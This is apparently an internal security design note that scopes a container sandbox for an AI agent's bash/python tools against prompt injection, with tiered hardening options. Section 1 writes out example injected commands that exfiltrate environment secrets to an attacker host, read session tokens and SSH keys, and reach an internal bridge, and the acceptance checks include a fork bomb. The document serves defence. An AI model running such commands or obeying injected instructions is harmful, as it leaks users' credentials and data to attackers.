# Scoping: a `bash` / `python` Sandbox for the Docker Deployment

**Date:** 2026-06-12
**Context:** R-1 in `agent-tool-attack-surface.md` — the single largest residual risk after
the mid-loop fencing (F-1) and ledger write-confinement (F-6). Those raise the bar against
an injection *deciding* to do harm; this is the missing *second line of defense* if the
model obeys an injection that reaches `bash`/`python`.

**Deployment assumption:** Docker Compose on Docker Desktop for macOS, single admin user
(the agent runs with full tool authority). If you ever run the **native** `start-macos.sh`
path instead, `bash` runs directly on the host with your full user account — strictly worse,
and none of the container controls below apply. Containerize first.

---

## 1. What `bash`/`python` get today (verified-in-code)

From `src/tool_execution.py:720-763` + `docker-compose.yml`:

| Dimension | Current state | Risk |
|---|---|---|
| **Process** | subprocess of uvicorn, inside the `odysseus` container, user `PUID=1000` | shares everything the app can reach |
| **Environment** | inherits **`**os.environ`** verbatim | **`env` leaks every secret** — `OPENAI_API_KEY`, `HF_TOKEN`, `ODYSSEUS_ADMIN_PASSWORD`, `DATA_BRAVE_API_KEY`, `GOOGLE_API_KEY`, `TAVILY_API_KEY`, `SERPER_API_KEY`, `SEARXNG_SECRET` |
| **Filesystem** | `cwd=/app/data`, `HOME=/app/data`; full container FS as user 1000 | reads/writes `sessions.json` (session tokens), `app.db`, the **ledger** (F-6 only guards the *file tools*, not bash), and the cookbook **`.ssh/` identity** (→ SSH to your remote servers) |
| **Network** | compose network + `host.docker.internal:host-gateway` | unrestricted egress: exfil to any URL, **SSRF** to `searxng:8080` / `chromadb:8000`, host **Ollama:11434**, and the **ToufHealth bridge:8770** (24 host tools, reads WHOOP tokens) |
| **Resources** | only a wall-clock timeout | fork bombs / memory exhaustion bounded only by time |

**One-line proofs of the gap** an injected `bash` could run today:
`env | curl -d @- https://attacker/`  ·  `cat /app/data/sessions.json`  ·
`cat /app/.ssh/id_* `  ·  `curl host.docker.internal:8770/...` (drive the bridge).

## 2. Design tension

`bash`/`python` exist to be *useful* — git, tests, data wrangling on a working file. A
sandbox must keep legitimate local compute while cutting the dangerous reaches: **secrets,
egress, sensitive FS, internal-service/bridge reachability.** The four are separable; we can
close them in cheap-first order.

## 3. Options (increasing isolation / effort)

### Tier A — In-process hardening *(hours, no architecture change)*
Implemented entirely in `tool_execution.py`:
1. **Scrub the env** — stop passing `**os.environ`. Pass a minimal allowlist
   (`PATH`, `HOME`, `TERM`, `LANG`, `LC_*`, `COLUMNS`, `LINES`). Kills secret exfil via `env`
   instantly. *Highest value-to-effort in the whole doc.*
2. **Dedicated scratch workdir** — set `cwd`/`HOME` to `/app/data/sandbox` (created, and
   **not** the root of `data/`), so a bare `ls`/`cat` doesn't sit on `sessions.json`,
   `app.db`, the ledger, or `.ssh`. (Doesn't *prevent* absolute-path access — that needs a
   namespace — but removes the easy footgun and the relative-path blast radius.)
3. **Resource caps** — `resource.setrlimit` (CPU, `RLIMIT_AS` memory, `RLIMIT_NPROC`,
   `RLIMIT_FSIZE`) via a `preexec_fn`, plus the existing timeout.

**Closes:** secret-env exfil, casual FS footguns, fork/mem bombs.
**Does NOT close:** network egress, absolute-path FS reads, bridge reachability. Honest
ceiling — Tier A is necessary but not sufficient.

### Tier B — Sandbox-runner sidecar container *(the real fix, ~1-2 days)*
A second Compose service the agent's code runs *in*, isolated from the app:

```yaml
  sandbox:
    build: ./docker/sandbox          # minimal image: python + coreutils + git
    network_mode: "none"             # NO egress, NO internal services, NO bridge
    read_only: true                  # immutable rootfs
    tmpfs:
      - /work:size=512m,mode=1777    # the only writable surface (scratch)
    cap_drop: [ALL]
    security_opt: [no-new-privileges:true]
    user: "65534:65534"              # nobody
    pids_limit: 256
    mem_limit: 512m
    cpus: "1.0"
    # NO bind of ./data, ./logs, .ssh; NO environment: secrets; NO extra_hosts
```

The app dispatches code over a **minimal stdin→stdout exec RPC on an internal-only socket**
(a ~50-line server in the sandbox image). **Do NOT mount the Docker socket into the app** to
run `docker exec` — that hands the agent host-root and is worse than the disease. Only a
named scratch file/dir the user is actively working on gets bind-mounted into `/work`, read
-write, nothing else.

**Closes:** egress, SSRF, bridge reach, secret env, sensitive FS, resource abuse — the whole
table. **Cost:** the agent's `bash`/`python` lose the app's data + network by default; you
opt specific paths in.

### Tier C — Egress allowlist *(only if code genuinely needs the internet)*
If the agent must `pip install` or call approved APIs from code, replace `network_mode:none`
with an `internal`-flagged network + a forward proxy (e.g. tinyproxy/squid) that allows only
an explicit host allowlist (pypi.org, files.pythonhosted.org, github.com). Block direct
sockets so all egress is funneled through the proxy. Adds a proxy service + `NET_ADMIN` on
the sandbox. Skip unless a real workflow needs it — default-deny is the better posture.

### Not recommended for this host
- **gVisor (`runsc`)** — strong, but the `runsc` runtime isn't cleanly available under Docker
  Desktop for macOS (its own VM). Revisit on a native Linux host.
- **Mounting the Docker socket** to spawn per-call containers — gives the agent host-root.
  Never do this from an agent-reachable process.

## 4. Recommendation

**Do Tier A now, then Tier B.** Tier A is a contained `tool_execution.py` change that kills
the worst single primitive (secret exfil via `env`) today and is independently shippable.
Tier B is the structural fix that actually earns the word "sandbox" — schedule it as a
follow-up once Tier A lands. Default the sandbox to **no network**; only add Tier C if a
concrete workflow proves it's needed.

Sequencing rationale: Tier A removes the highest-severity, lowest-effort exposure
immediately and doesn't conflict with Tier B (the env-scrub + rlimits carry into the sandbox
image). Tier B is a day of Compose + a tiny RPC, not a rewrite.

## 5. Acceptance checks (how we'll know it works)
- `env` inside the agent's `bash` shows **no** API key / admin password (A).
- `cat /app/data/sessions.json` from the agent's `bash` **fails** (B; A moves the cwd only).
- `curl https://example.com` and `curl host.docker.internal:8770` from the agent's `bash`
  **fail** (B).
- `:(){ :|:& };:` and a 2 GB allocation are killed by limits, not by hanging the host (A).
- Legitimate `git status`, `python -c "print(1+1)"`, and processing a user file mounted into
  `/work` still **work** (A + B).

## 6. Out of scope here
Network-level SSRF for the *server itself* (R-2, `base_url`) and content-aware provenance
(R-3) are tracked separately in `agent-tool-attack-surface.md`.
